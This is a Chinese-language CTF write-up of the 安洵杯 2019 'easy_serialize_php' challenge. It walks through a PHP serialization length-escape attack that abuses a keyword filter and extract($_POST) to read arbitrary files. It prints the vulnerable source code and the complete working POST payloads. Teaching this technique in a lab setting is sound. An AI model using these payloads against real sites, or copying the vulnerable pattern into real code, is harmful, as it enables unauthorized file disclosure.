---
date: 2026-11-03 20:40:00
slug: anxunbei2019-easy-serialize-php
categories:
  - PHP
  - 反序列化
  - 代码审计
---

# [安洵杯 2019] easy_serialize_php — 长度声明是过滤前算的

> **题目类型**：PHP 反序列化 — 序列化字符串逃逸（长度变化）
>
> **Flag**：`CTF2{dad89ab0-9990-4063-bc5a-fabbcc9cb29e}`

---

## 题目概述

页面就一句 `source_code` 链接，点进去是源码。这题的坑不在链子，在**长度**。

---

## 解题过程

### Step 1：读源码，先找 sink

```php
function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;
extract($_POST);

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();');
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}
```

**能读文件的是 `show_image` 分支：**

```php
$userinfo = unserialize($serialize_info);
echo file_get_contents(base64_decode($userinfo['img']));
```

**所以目标是：让 `$userinfo['img']` 等于**某个文件路径的 base64**。**

### Step 2：为什么不能直接改 img

**`$_SESSION['img']` 在两个分支里都被无条件赋值，而且是在 `extract($_POST)` **之后**：**

```php
if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}
```

**所以你 POST 里传的 `img` 会被覆盖掉；`sha1()` 的输出又永远是 40 位十六进制，**注入不进去任何结构**。**

**这条路封死。真正的入口是 `filter()`——它会把序列化串里的 `php`、`flag` 删掉。**

### Step 3：错位从这里开始

**`serialize()` 里的长度声明是**按过滤前的内容算**的，但 `filter()` 之后内容变短了：**

```
序列化：s:7:"phpflag";     ← 声明读 7 个字节
过滤后：s:7:"";            ← 内容被删光，0 个字节
```

**解析器不会报错，它按规则**从引号后面数 7 个字节**——数到的是后面那段内容。**

**这就是“逃逸”：长度声明和实际内容不匹配，解析器多读的那部分，变成了下一个结构。**

### Step 4：我把 payload 放错了位置（三次错）

**① 填充放在**值**里——废**

**我把 `php` 重复十几次塞进 `user` 的值里，想让 filter 删掉它们。**结果：**

```
过滤前: s:4:"user";s:89:"guestphpphp…php";}s:3:"img";…"
过滤后: s:4:"user";s:89:"guest";}s:3:"img";…"
                     └ 声明 89，实际只剩 47 ┘
```

**解析器从 `guest` 往后数 89 个字节，把我写的 `";}s:3:"img";...` **全算进了 user 的值里**——我写的结构一次都没被当成结构，只是被当成字符。`unserialize` 返回 `false`。**

**② 填充放在**键名**里——对**

**键名的写法也是 `s:N:"键名"`，同样有长度声明，同样会被删：**

```
过滤前: s:7:"phpflag";s:48:";s:1:"1";s:3:"img";s:20:"ZDBn…";}"
过滤后: s:7:"";s:48:";s:1:"1";s:3:"img";s:20:"ZDBn…";}"
```

**这次断的是**键名和值的交界处**，值本身是完整的。解析器从值里借 7 个字节当键名，剩下的部分就变成了**新的结构**。**

**③ 还手写过整条序列化串——那也是错的**

**这题**不需要你写序列化串**。`serialize($_SESSION)` 是服务器自己做的。我一开始写成这样：**

```
O:7:"Session":3:{s:4:"user";…}
```

**两个问题：**

```
O: 是对象格式，$_SESSION 是数组，应该是 a:
没有 Session 这个类 → 变成 __PHP_Incomplete_Class → 后面不能当数组用
```

**你的 payload 只是 POST 里的**一个字符串值**。**

### Step 5：参数名也写错了

**我写的是 `$_SESSION['flag']=...`——这是 PHP 语法，不是 HTTP 参数名。**

**HTTP 里要写：**

```
_SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
```

**注意这里没有 `$`、没有单引号。**

### Step 6：一个意外发现——数组只剩 2 个元素

**`extract($_POST)` 把 `_POST['_SESSION']` 这个**数组**整体赋给了 `$_SESSION`，**不是往里面加键，而是整个替换掉**。**

**所以服务器真正的序列化串是：**

```
a:2:{s:7:"phpflag";s:48:";s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
```

**只有 2 个元素：我的键 + img。`user` 和 `function` 已经不存在了。**

**这也解释了那个 `;s:1:"1";` 是干什么的——占一个元素的位置，让解析出来的元素数正好等于 `a:2:` 声明的 2 个。**

### Step 7：逐字节看解析过程

**过滤后的串：**

```
a:2:{s:7:"";s:48:";s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
```

**解析器这样走：**

```text
① a:2:{                    → 要读 2 组键值对
② 读第 1 组的键:  s:7  →  从引号后数 7 个字节 = '";s:48:'
③ 读第 1 组的值:  s:1  →  读 1 个字节 = '1'
④ 读第 2 组的键:  s:3  →  'img'
⑤ 读第 2 组的值:  s:20 →  'ZDBnM19mMWFnLnBocA=='
⑥ 读到 '}'，结束。后面那段"真正的 img"被丢弃
```

**最终：`$userinfo['img'] = 'ZDBnM19mMWFnLnBocA=='`。**

**第一步最关键：`phpflag` 被删光，但 `s:7` 的声明还在，解析器不会“觉得不对”，它只是从下一个字节开始数 7 个。**

### Step 8：读文件

**`ZDBnM19mMWFnLnBocA==` 解出来是 `d0g3_f1ag.php`：**

```
file_get_contents(base64_decode('ZDBnM19mMWFnLnBocA=='))
→ <?php $flag = 'flag in /d0g3_fllllllag'; ?>
```

**真正的 flag 在 `/d0g3_fllllllag`，重新算 base64：**

```
/d0g3_fllllllag  →  L2QwZzNfZmxsbGxsbGFn
```

**再发一次：**

```text
POST _SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
GET  ?f=show_image
```

```text
CTF2{dad89ab0-9990-4063-bc5a-fabbcc9cb29e}
```

---

## 解题思路总结

```text
读源码 → sink 在 show_image：unserialize + base64_decode + file_get_contents
       → img 被代码无条件覆盖，注入不进去
         → 突破口：filter 会删 php/flag，让长度声明和内容不匹配
           → 填充放在"值"里 → 解析器把后面的结构一起吞掉（失败）
             → 填充放在"键名"里 → 断点落在键名/值交界，落点可控（成功）
               → 补一个假元素 ;s:1:"1"; 让元素数对上 a:2
                 → 读出 d0g3_f1ag.php → 里面写着真实路径 → 再来一次
```

### 漏洞原理

**① 长度声明是“过滤前”算的**

**`serialize()` 生成的 `s:N:"..."` 是按当时内容的长度算的；`filter()` 改了内容，`N` 却不会变。**

**解析器只认 `N`：它从引号后精确数 `N` 个字节。**内容短了，它就多读到后面的东西——**多读的部分被当成新结构。**

**② 错位点在哪，决定了你能不能控制**

```
填充在值里   →  值本身断裂，后面全被当字符吞掉  →  不可控
填充在键名里 →  值完整，断点落在"键名结束 → 值开始"  →  可控
```

**③ `extract()` 同名会整体替换**

**`_POST['_SESSION']` 是数组，`extract` 会把它整个赋给 `$_SESSION`，**不是合并**。**所以 `user`、`function` 消失了，数组只剩你的键和 `img`。**

**这也是为什么 `a:2`——不是 3。**

### 关键知识点

| 知识点 | 说明 |
|---|---|
| 序列化逃逸 | `s:N:"..."` 的 `N` 是过滤前算的，内容变短后解析器会多读 |
| 填充位置 | 放键名可控，放值里会把你的结构一起吞掉 |
| `;s:1:"1";` | 假元素，用来把元素数凑回 `a:N` 声明的数量 |
| 元素数必须对上 | 解析出来的键值对数与 `a:N` 不符 → `unserialize` 返回 false |
| `extract()` | 同名键是**整体替换**，不是合并 |
| 数组 vs 对象 | `$_SESSION` 是数组用 `a:`，`O:` 是对象，混用会变 `__PHP_Incomplete_Class` |
| HTTP 参数写法 | `_SESSION[键]=值`，不写 `$`、不写引号 |
| 二次读取 | 读到的文件里可能还写着真正的 flag 路径 |

---

??? note "完整 payload"

    ```text
    GET  /index.php?f=show_image

    POST _SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
    → 返回 d0g3_f1ag.php 的内容：$flag = 'flag in /d0g3_fllllllag';

    POST _SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
    → CTF2{dad89ab0-9990-4063-bc5a-fabbcc9cb29e}
    ```

??? note "这题踩的坑"

    **① 填充放在值里**

    最常见的错。**看起来"filter 会删掉填充，所以后面就对齐了"——恰恰相反：填充被删掉只会让声明比内容更长，多出来的长度把后面的一切都吃掉。**

    **② 手写整条序列化串**

    **这题服务器自己 `serialize()`，你交的只是一个值。**行首的 `a:2:` 是它数出来的，不是你写的。

    **③ `$_SESSION['flag']=` 当参数名**

    **那是 PHP 语法。HTTP 里是 `_SESSION[flag]=`。**

    **④ 以为数组有 3 个元素**

    **`extract` 是整体替换，`user`/`function` 早没了，只剩 2 个。**
